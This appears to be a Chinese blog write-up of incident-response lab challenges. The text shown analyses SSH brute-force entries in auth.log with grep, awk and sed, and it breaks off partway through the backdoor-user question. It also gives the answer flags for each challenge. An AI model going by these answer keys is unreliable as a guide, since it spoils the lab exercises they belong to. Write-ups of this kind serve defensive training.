@@ -1,0 +1,1426 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="玄机打靶日记 第一章 应急响应-Linux日志分析 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&ldquo;分割 查看/var/log目录下的auth.log*\n1 cat /var/log/auth.log* 发现有\n1 Failed password for root grep一下\n1 cat /var/log/auth.log* | grep -a &#34;Failed password for root&#34; ">
+<title>玄机打靶日记</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="玄机打靶日记">
+<meta property='og:description' content="玄机打靶日记 第一章 应急响应-Linux日志分析 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&ldquo;分割 查看/var/log目录下的auth.log*\n1 cat /var/log/auth.log* 发现有\n1 Failed password for root grep一下\n1 cat /var/log/auth.log* | grep -a &#34;Failed password for root&#34; ">
+<meta property='og:url' content='https://0d000721999.github.io/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='打靶' /><meta property='article:published_time' content='2025-05-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-05-08T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.png' />
+<meta name="twitter:title" content="玄机打靶日记">
+<meta name="twitter:description" content="玄机打靶日记 第一章 应急响应-Linux日志分析 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&ldquo;分割 查看/var/log目录下的auth.log*\n1 cat /var/log/auth.log* 发现有\n1 Failed password for root grep一下\n1 cat /var/log/auth.log* | grep -a &#34;Failed password for root&#34; "><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#第一章-应急响应-linux日志分析">第一章 应急响应-Linux日志分析</a>
+      <ol>
+        <li><a href="#1有多少ip在爆破主机ssh的root帐号如果有多个使用分割">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&ldquo;分割</a></li>
+        <li><a href="#2ssh爆破成功登陆的ip是多少如果有多个使用分割">2.ssh爆破成功登陆的IP是多少，如果有多个使用&rdquo;,&ldquo;分割</a></li>
+        <li><a href="#3爆破用户名字典是什么如果有多个使用分割">3.爆破用户名字典是什么？如果有多个使用&rdquo;,&ldquo;分割</a></li>
+        <li><a href="#4登陆成功的ip共爆破了多少次">4.登陆成功的IP共爆破了多少次</a></li>
+        <li><a href="#5黑客登陆主机后新建了一个后门用户用户名是多少">5.黑客登陆主机后新建了一个后门用户，用户名是多少</a></li>
+      </ol>
+    </li>
+    <li><a href="#第一章-应急响应-webshell查杀">第一章 应急响应-webshell查杀</a>
+      <ol>
+        <li><a href="#1黑客webshell里面的flag-flagxxxxx-xxxx-xxxx-xxxx-xxxx">1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</a></li>
+        <li><a href="#2黑客使用的什么工具的shell-github地址的md5-flagmd5">2.黑客使用的什么工具的shell github地址的md5 flag{md5}</a></li>
+        <li><a href="#3黑客隐藏shell的完整路径的md5-flagmd5-注--xxxxxxxxxxxxxxxxxx">3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx</a></li>
+        <li><a href="#4黑客免杀马完整路径-md5-flagmd5">4.黑客免杀马完整路径 md5 flag{md5}</a></li>
+      </ol>
+    </li>
+    <li><a href="#第一章-应急响应--linux入侵排查">第一章 应急响应- Linux入侵排查</a>
+      <ol>
+        <li><a href="#1web目录存在木马请找到木马的密码提交">1.web目录存在木马，请找到木马的密码提交</a></li>
+        <li><a href="#2服务器疑似存在不死马请找到不死马的密码提交">2.服务器疑似存在不死马，请找到不死马的密码提交</a></li>
+        <li><a href="#3不死马是通过哪个文件生成的请提交文件名">3.不死马是通过哪个文件生成的，请提交文件名</a></li>
+        <li><a href="#4黑客留下了木马文件请找出黑客的服务器ip提交">4.黑客留下了木马文件，请找出黑客的服务器ip提交</a></li>
+        <li><a href="#5黑客留下了木马文件请找出黑客服务器开启的监端口提交">5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</a></li>
+      </ol>
+    </li>
+    <li><a href="#第二章日志分析-redis应急响应">第二章日志分析-redis应急响应</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">
+                <img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.png"
+                        
+                        width="1216" 
+                        height="832" 
+                        loading="lazy"
+                        alt="Featured image of post 玄机打靶日记" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%88%B7%E9%A2%98%E6%89%93%E9%9D%B6/" style="background-color: #264653; color: #fff;">
+                刷题&amp;&amp;打靶
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">玄机打靶日记</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 08, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="玄机打靶日记">玄机打靶日记
+</h1><h2 id="第一章-应急响应-linux日志分析">第一章 应急响应-Linux日志分析
+</h2><h3 id="1有多少ip在爆破主机ssh的root帐号如果有多个使用分割">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&ldquo;分割
+</h3><p>查看/var/log目录下的auth.log*</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508195605363.png"
+	width="1595"
+	height="778"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508195605363_hu5463678624982081567.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508195605363_hu17660861257137032462.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250508195605363"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="492px"
+	
+></p>
+<p>发现有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Failed password for root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>grep一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Failed password for root&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508195827252.png"
+	width="1110"
+	height="147"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508195827252_hu6955343765127267492.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508195827252_hu8891854164844922116.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250508195827252"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="755"
+		data-flex-basis="1812px"
+	
+></p>
+<p>找到三个ip</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.200.2,192.168.200.31,192.168.200.32}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2ssh爆破成功登陆的ip是多少如果有多个使用分割">2.ssh爆破成功登陆的IP是多少，如果有多个使用&rdquo;,&ldquo;分割
+</h3><p>前下看到有下面这个字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Accepted password for root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>grep一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Accepted password for root&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508200327549.png"
+	width="934"
+	height="91"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508200327549_hu15121614500471108172.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508200327549_hu8737746980296805395.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250508200327549"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1026"
+		data-flex-basis="2463px"
+	
+></p>
+<p>排除自己的ip</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.200.2}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3爆破用户名字典是什么如果有多个使用分割">3.爆破用户名字典是什么？如果有多个使用&rdquo;,&ldquo;分割
+</h3><p>先过滤Failed password</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Failed password&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508200633801.png"
+	width="1205"
+	height="526"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508200633801_hu15493644571240261866.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508200633801_hu2107425378680437720.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250508200633801"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="549px"
+	
+></p>
+<p>对结果进行清洗</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Failed password&#34;</span>  <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="mi">2</span><span class="o">|</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1</span><span class="se">\n</span><span class="s1">&#34;;}&#39;</span><span class="o">|</span><span class="n">uniq</span> <span class="o">-</span><span class="n">c</span><span class="o">|</span><span class="n">sort</span> <span class="o">-</span><span class="n">nr</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>sort -nr</code>是逆序排序</p>
+<p><code>uniq -c</code>统计重复行的次数，输出重复次数和内容</p>
+<p><code>for(.*?) from</code>正则匹配for和from中间字段</p>
+<p><code>print &quot;$1\n&quot;</code>输出匹配的第一个字符</p>
+<p><code>while($_=&lt;&gt;)</code>逐行读取grep后的信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Failed password&#34;</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="n">F</span> <span class="s1">&#39;for &#39;</span> <span class="s1">&#39;{print $2}&#39;</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="n">F</span> <span class="s1">&#39; from&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">&#39;s/invalid user//g&#39;</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">&#39;s/^[ </span><span class="se">\t</span><span class="s1">]*//;s/[ </span><span class="se">\t</span><span class="s1">]*$//&#39;</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s1">&#39;^$&#39;</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">-</span><span class="n">c</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">nr</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里<code>$1</code>前面有<code>-F</code>参数，含义变为输出from前的字符，<code>$2</code>前面也有，含义变为输出for后的字符</p>
+<p><code>sed</code>作用去除制表符和指定的字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{user,hello,root,test3,test2,test1}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4登陆成功的ip共爆破了多少次">4.登陆成功的IP共爆破了多少次
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Failed password for root&#34;</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">&#39;{print $11}&#39;</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">n</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">-</span><span class="n">c</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者直接看（</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Failed password for root from 192.168.200.2&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{4}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5黑客登陆主机后新建了一个后门用户用户名是多少">5.黑客登陆主机后新建了一个后门用户，用户名是多少
+</h3><p>前下查看日志看到useradd</p>
+<p>grep一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;useradd&#34;</span>
